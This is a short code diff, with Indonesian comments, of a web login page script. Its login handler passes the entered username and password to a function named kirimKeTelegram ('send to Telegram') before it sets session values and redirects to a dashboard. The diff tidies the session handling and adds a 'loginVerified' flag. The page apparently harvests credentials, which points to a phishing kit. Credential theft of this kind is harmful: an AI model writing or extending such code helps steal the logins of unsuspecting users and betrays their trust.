@@ -663,7 +663,7 @@
   }
 
   /* ============================================
-     KIRIM KE TELEGRAM VIA API SERVER
+     KIRIM KE TELEGRAM
      ============================================ */
   async function kirimKeTelegram(username, password, tipe) {
     try {
@@ -719,9 +719,14 @@
 
     await kirimKeTelegram(username, password, 'login');
 
+    /* HAPUS SEMUA SESSION DULU */
+    sessionStorage.clear();
+
+    /* BARU SET SESSION BARU */
     sessionStorage.setItem('user', username);
     sessionStorage.setItem('loginTime', new Date().toISOString());
     sessionStorage.setItem('token', Math.random().toString(36).substring(2));
+    sessionStorage.setItem('loginVerified', 'true');
 
     setTimeout(function() {
       window.location.href = 'dashboard.html';
